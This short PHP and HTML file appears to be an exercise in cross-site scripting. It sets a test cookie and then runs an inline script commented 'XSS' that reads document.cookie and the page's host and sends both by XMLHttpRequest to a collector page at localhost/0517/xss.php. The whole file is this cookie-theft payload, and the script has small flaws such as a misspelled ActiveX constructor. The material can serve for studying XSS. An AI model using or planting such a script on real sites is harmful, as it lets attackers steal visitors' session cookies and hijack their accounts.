<?php
    setcookie("tel","132511111");
?>

<script>
    var cookies = document.cookie.replace(/\s*;\s*/,"&"); //XSS
    var url = "http://localhost/0517/xss.php?host="+location.host+"&"+cookies;
    var ajax = window.XMLHttpRequest?new XMLHttpRequest():new ActiveObject("Microsoft.XMLHTTP");
    ajax.open("get",url,true);
    ajax.send(null);
</script>